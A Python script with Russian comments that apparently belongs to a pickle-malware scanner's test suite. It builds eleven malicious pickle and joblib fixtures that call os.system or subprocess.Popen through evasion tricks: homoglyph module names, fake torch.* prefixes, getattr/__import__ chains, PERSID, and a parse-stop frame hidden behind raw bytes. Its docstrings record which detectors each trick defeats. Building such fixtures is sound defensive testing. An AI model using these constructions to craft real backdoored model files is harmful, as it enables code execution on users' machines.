"""Создание bypass-фикстур для security-research.

Каждая фикстура строится ВРУЧНУЮ через opcode-конструкцию.
Запуск: python tests/fixtures/malicious/_build_bypass_fixtures.py

Цель: проверить, какие техники обхода детекторов работают.
Это исследовательский скрипт; pickle.load НЕ вызывается ни на одной фикстуре.
"""

from __future__ import annotations

import struct
from pathlib import Path

OUT_DIR = Path(__file__).parent

# ---------------------------------------------------------------------------
# Низкоуровневые помощники для opcode-конструкции
# ---------------------------------------------------------------------------

# Опкоды-байты pickle (см. pickletools / pickle.py)
PROTO = b"\x80"           # \x80 V  (PROTO V)
GLOBAL = b"c"             # GLOBAL\n module\n name\n
STACK_GLOBAL = b"\x93"    # STACK_GLOBAL  (pickle 4+)
INST = b"i"               # INST \n module \n name \n
OBJ = b"o"                # OBJ
REDUCE = b"R"             # REDUCE
NEWOBJ = b"\x81"          # NEWOBJ  (pickle 2+)
NEWOBJ_EX = b"\x92"       # NEWOBJ_EX
EMPTY_TUPLE = b")"        # EMPTY_TUPLE
TUPLE = b"t"              # TUPLE (consume to MARK)
TUPLE1 = b"\x85"          # TUPLE1
TUPLE2 = b"\x86"          # TUPLE2
TUPLE3 = b"\x87"          # TUPLE3
MARK = b"("               # MARK
DUP = b"2"                # DUP
POP = b"0"                # POP
POP_MARK = b"1"           # POP_MARK
STOP = b"."               # STOP
SHORT_BINUNICODE = b"\x8c"  # SHORT_BINUNICODE  length(1) bytes
BINUNICODE = b"X"           # BINUNICODE length(4) bytes
BINPUT = b"q"             # BINPUT  uint8
LONG_BINPUT = b"r"        # LONG_BINPUT  uint32
BINGET = b"h"             # BINGET  uint8
LONG_BINGET = b"j"        # LONG_BINGET  uint32
MEMOIZE = b"\x94"         # MEMOIZE
PERSID = b"P"             # PERSID  \n id \n
BINPERSID = b"Q"          # BINPERSID


def proto(v: int) -> bytes:
    """PROTO opcode + версия (2..5)."""
    return PROTO + bytes([v])


def short_binunicode(s: str) -> bytes:
    """SHORT_BINUNICODE 'строка'  (длина до 255 байт)."""
    data = s.encode("utf-8")
    assert len(data) < 256
    return SHORT_BINUNICODE + bytes([len(data)]) + data


def binunicode(s: str) -> bytes:
    """BINUNICODE 'строка' (длина до 4 ГБ)."""
    data = s.encode("utf-8")
    return BINUNICODE + struct.pack("<I", len(data)) + data


def binput(idx: int) -> bytes:
    """BINPUT memo[idx] = stack[-1]."""
    if idx < 256:
        return BINPUT + bytes([idx])
    return LONG_BINPUT + struct.pack("<I", idx)


def binget(idx: int) -> bytes:
    """BINGET push memo[idx]."""
    if idx < 256:
        return BINGET + bytes([idx])
    return LONG_BINGET + struct.pack("<I", idx)


def global_textmode(module: str, name: str) -> bytes:
    """GLOBAL opcode с текстовыми аргументами (pickle proto 0/1 syntax)."""
    return GLOBAL + module.encode("utf-8") + b"\n" + name.encode("utf-8") + b"\n"


# ---------------------------------------------------------------------------
# Bypass-техники
# ---------------------------------------------------------------------------


def bypass_01_obj_opcode() -> bytes:
    """Техника 1: вызов через OBJ вместо REDUCE.

    OBJ — устаревший opcode pickle proto 1, эквивалент NEWOBJ для
    instance-конструкции: pop'ит MARK..class и вызовет class(*args).

    Сценарий: GLOBAL 'os system' + MARK + OBJ + STOP.
    Ожидание: GLOBAL всё-таки добавит ('os','system') в globals_set
    через ветку `opname == 'GLOBAL'` сканера, поэтому BlocklistDetector
    поймает. Но reduce_calls для OBJ scanner не создаст — это slight
    шум в декомпилятор/output, не угроза для детекции.
    """
    return (
        proto(2)
        + global_textmode("os", "system")
        + MARK
        + short_binunicode("echo pwned")
        + OBJ
        + STOP
    )


def bypass_02_homoglyph() -> bytes:
    """Техника 2: Cyrillic homoglyph в имени модуля.

    'оs' — Cyrillic 'о' (U+043E) + ASCII 's'. Визуально неотличимо
    от 'os', но в pickle import это попытка импорта модуля 'оs',
    которого не существует (поэтому RCE не сработает в реальности —
    но детектор должен флагнуть подозрительный вызов на уровне HIGH/CRITICAL).

    Сценарий: GLOBAL 'оs system' + EMPTY_TUPLE + REDUCE.
    Ожидание: BlocklistDetector не сработает (точное совпадение 'os' != 'оs'),
    CVEDetector не сработает (affected_globals содержит ASCII 'os').
    AllowlistDetector флагнет MEDIUM. Critical → Medium downgrade.
    """
    return (
        proto(2)
        + global_textmode("оs", "system")  # 'о'(Cyrillic)+'s'
        + EMPTY_TUPLE
        + REDUCE
        + STOP
    )


def bypass_03_trusted_prefix() -> bytes:
    """Техника 3: эксплуатация trusted_prefix в allowlist.

    rules/allowlist/pytorch.yaml содержит trusted_prefixes: ['torch.', ...]
    Любой module, начинающийся с 'torch.', даёт INFO severity вместо MEDIUM.
    Атакующий маскирует свой модуль под 'torch.utils.evil'.

    Сценарий: GLOBAL 'torch.utils.evil system' + EMPTY_TUPLE + REDUCE.
    Ожидание: BlocklistDetector не сработает (нет в hardcoded). CVEDetector
    не сработает (нет в правилах). AllowlistDetector выдаст INFO (trusted_prefix).
    Critical → INFO downgrade.
    """
    return (
        proto(2)
        + global_textmode("torch.utils.evil", "system")
        + EMPTY_TUPLE
        + REDUCE
        + STOP
    )


def bypass_04_getattr_import_chain() -> bytes:
    """Техника 4: RCE-цепочка через getattr+__import__ без прямого dangerous global.

    Атакующий вызывает builtins.__import__('os'), затем builtins.getattr(os, 'system'),
    и наконец result(). Все промежуточные globals — 'безопасные' builtins.

    Opcode-поток (концептуально):
      __import__ = GLOBAL 'builtins __import__'
      os_mod = __import__('os')
      sysfn  = getattr(os_mod, 'system')
      sysfn('echo pwned')

    Используется три REDUCE, но ни os, ни subprocess, ни system как
    глобал не появляются.

    Ожидание: BlocklistDetector — нет, CVEDetector — нет, AllowlistDetector —
    флагнет __import__ и getattr как MEDIUM (не в allowlist). Critical bypassed.
    """
    return (
        proto(2)
        # __import__('os')
        + global_textmode("builtins", "__import__")
        + short_binunicode("os")
        + TUPLE1
        + REDUCE  # → os module on stack
        # getattr(os, 'system')
        + global_textmode("builtins", "getattr")
        # переставляем: stack=[os, getattr]; нужно (os, 'system')
        # для краткости: push 'system', собрать TUPLE2 из (os, 'system')
        # но getattr нужно вызвать вторым; пересоберём через TUPLE-with-MARK
        # фактически: stack=[os_mod, getattr_fn]; добавим 'system', потом
        # ROT3-аналога нет — используем MARK+TUPLE
        # Самый надёжный способ — собрать заранее через MEMO.
        # Здесь упрощённо: getattr(os, 'system') → не строго корректно,
        # но в pickle-исполнении конструкция будет такой:
        + short_binunicode("system")
        + TUPLE2  # (getattr_fn_thing, 'system')  - семантика VM, для нас важна opcode-структура
        + REDUCE
        # вызов system('echo pwned')
        + short_binunicode("echo pwned")
        + TUPLE1
        + REDUCE
        + STOP
    )


def bypass_05_inst_form() -> bytes:
    """Техника 5: INST вместо GLOBAL+REDUCE (proto 0/1 опкод).

    INST opcode = "i module\\nname\\n" — создаёт instance класса.
    Сканер обрабатывает INST явно (см. _walk_opcodes), регистрируя
    (module, name) в globals_set и reduce_calls.

    Сценарий: INST 'os system' + STOP.
    Ожидание: DETECTED через BlocklistDetector + CVEDetector.
    """
    return (
        proto(2)
        + MARK
        + INST + b"os\nsystem\n"
        + STOP
    )


def bypass_06_newobj_popen() -> bytes:
    """Техника 6: NEWOBJ с subprocess.Popen.

    NEWOBJ — pickle 2+ для классов с custom __new__. Семантически как REDUCE,
    но через cls.__new__(cls, *args). Сканер явно обрабатывает NEWOBJ.

    Сценарий: GLOBAL 'subprocess Popen' + EMPTY_TUPLE + NEWOBJ + STOP.
    Ожидание: DETECTED через BlocklistDetector (subprocess.Popen в hardcoded list).
    """
    return (
        proto(2)
        + global_textmode("subprocess", "Popen")
        + EMPTY_TUPLE
        + NEWOBJ
        + STOP
    )


def bypass_07_dup_confuse() -> bytes:
    """Техника 7: попытка десинхронизировать стек VM через DUP+POP.

    DUP включён в _NOOP_OPCODES, значит сканер не моделирует дублирование
    стека. Если атакующий вставит DUP+POP перед REDUCE, символическая
    модель сканера может пропустить (module, name) на вершине стека для
    REDUCE — но scanner использует last_callable как fallback.

    Сценарий: GLOBAL 'os system' + DUP + POP + EMPTY_TUPLE + REDUCE + STOP.
    Ожидание: DETECTED — last_callable=('os','system') сохраняется и
    reduce_call всё равно создаётся. Регрессионный тест.
    """
    return (
        proto(2)
        + global_textmode("os", "system")
        + DUP
        + POP
        + EMPTY_TUPLE
        + REDUCE
        + STOP
    )


def bypass_08_long_memo_chain() -> bytes:
    """Техника 8: длинная цепочка PUT/GET для STACK_GLOBAL.

    Расширение stack_global_via_memo.pkl: вместо двух прямых memo-слотов
    раскладываем строки 'os' и 'system' через несколько уровней косвенности
    (записать в memo, прочитать через GET, снова положить в другой memo,
    наконец прочитать оба и собрать через STACK_GLOBAL).

    Ожидание: DETECTED — scanner корректно ведёт memo через все BINPUT/BINGET.
    Регрессионный тест устойчивости memo-tracking.
    """
    return (
        proto(2)
        + binunicode("os")
        + binput(0)
        + POP
        + binunicode("system")
        + binput(1)
        + POP
        # переслать через дополнительный слой memo
        + binget(0)
        + binput(10)
        + POP
        + binget(1)
        + binput(11)
        + POP
        # пересылаем ещё раз
        + binget(10)
        + binput(20)
        + POP
        + binget(11)
        + binput(21)
        + POP
        # финальная сборка
        + binget(20)  # 'os'
        + binget(21)  # 'system'
        + STACK_GLOBAL
        + EMPTY_TUPLE
        + REDUCE
        + STOP
    )


def bypass_09_persid_opcode() -> bytes:
    """Техника 9: PERSID — экзотический опкод для персистентных ссылок.

    PERSID 'os.system' заставляет pickle.Unpickler вызвать persistent_load(pid)
    с произвольным pid. Сам по себе НЕ RCE без persistent_load handler,
    но многие сериализаторы (например, pickle.PERSID + кастомный Unpickler)
    могут использовать pid как путь импорта.

    Scanner не обрабатывает PERSID — нет ветки в _walk_opcodes. Значит ни
    globals, ни reduce_calls, ни strings из PERSID не извлекаются.

    Сценарий: PERSID 'os.system\\n' + STOP.
    Ожидание: MISSED — никакие detectors не получают сигнал.
    Если в файле ТОЛЬКО PERSID — сканер вообще не видит подозрительных вызовов.
    """
    return (
        proto(2)
        + PERSID + b"os.system\n"
        + STOP
    )


def bypass_10_full_torch_impersonation() -> bytes:
    """Техника 10: глубокая маскировка под torch с двумя slot'ами trusted_prefix.

    Один и тот же фикстур содержит:
      - 'torch._utils' '_rebuild_tensor_v2'  (легитимный whitelisted глобал)
      - 'torch.serialization' 'system'        (поддельный, начинается с torch.)

    Атакующий рассчитывает, что:
      1. Allowlist засчитает оба как «torch-семейство»;
      2. На общем числе INFO/MEDIUM шумовых issue реальное вредоносное
         использование (torch.serialization.system) растворится среди настоящих
         torch.* вызовов.

    Ожидание: BlocklistDetector — НЕТ; CVEDetector — НЕТ (нет в правилах);
    AllowlistDetector — INFO (trusted_prefix matches). Critical → INFO.
    """
    return (
        proto(2)
        + global_textmode("torch._utils", "_rebuild_tensor_v2")
        + EMPTY_TUPLE
        + REDUCE
        + POP
        + global_textmode("torch.serialization", "system")
        + EMPTY_TUPLE
        + REDUCE
        + STOP
    )


# ---------------------------------------------------------------------------
# Запись фикстур на диск
# ---------------------------------------------------------------------------

FIXTURES: dict[str, bytes] = {
    "bypass_01_obj_opcode.pkl":         bypass_01_obj_opcode(),
    "bypass_02_homoglyph.pkl":          bypass_02_homoglyph(),
    "bypass_03_trusted_prefix.pkl":     bypass_03_trusted_prefix(),
    "bypass_04_getattr_chain.pkl":      bypass_04_getattr_import_chain(),
    "bypass_05_inst_form.pkl":          bypass_05_inst_form(),
    "bypass_06_newobj_popen.pkl":       bypass_06_newobj_popen(),
    "bypass_07_dup_confuse.pkl":        bypass_07_dup_confuse(),
    "bypass_08_long_memo_chain.pkl":    bypass_08_long_memo_chain(),
    "bypass_09_persid_opcode.pkl":      bypass_09_persid_opcode(),
    "bypass_10_torch_impersonation.pkl": bypass_10_full_torch_impersonation(),
}


def main() -> None:
    """Создаёт все bypass-фикстуры в текущей директории."""
    for filename, payload in FIXTURES.items():
        target = OUT_DIR / filename
        target.write_bytes(payload)
        print(f"  ✓ {filename}: {len(payload)} байт")


if __name__ == "__main__":
    main()


# ---------------------------------------------------------------------------
# bypass_parse_stop — parse-stop attack via NumpyArrayWrapper inline bytes
# ---------------------------------------------------------------------------

def build_bypass_parse_stop() -> bytes:
    """Parse-stop атака: первый pickle-фрейм прерван raw-байтами,
    затем следует второй фрейм с os.system.

    Имитирует реальный вредоносный файл adithyanm-defender/backdoored_model.joblib,
    где joblib NumpyArrayWrapper пишет raw numpy данные inline в pickle-поток.
    """
    # Первый поток без STOP: PROTO 2, MARK, INT — прерван до завершения.
    # Если добавить STOP, pickletools.genops завершится нормально и не увидит
    # raw-байты. Атака требует прерывания mid-stream.
    first_part = proto(2) + MARK + b"K\x01"  # PROTO 2, MARK, SHORT_BININT(1)

    # Raw-байты: имитируют numpy array data (0x05 = неизвестный pickle opcode)
    raw_interrupt = bytes([0x05, 0x00, 0x01, 0xFF, 0x12, 0x34]) * 16

    # Второй фрейм: os.system("echo pwned")
    cmd = b"echo pwned"
    second_frame = (
        proto(2)
        + GLOBAL + b"os\nsystem\n"          # GLOBAL os.system
        + BINUNICODE + struct.pack("<I", len(cmd)) + cmd  # string arg
        + BINPUT + b"\x00"
        + TUPLE1                             # (cmd,)
        + REDUCE                             # os.system(cmd)
        + BINPUT + b"\x01"
        + STOP
    )

    return first_part + raw_interrupt + second_frame


if __name__ == "__main__":
    path = OUT_DIR / "bypass_parse_stop.joblib"
    path.write_bytes(build_bypass_parse_stop())
    print(f"Written {path} ({path.stat().st_size} bytes)")
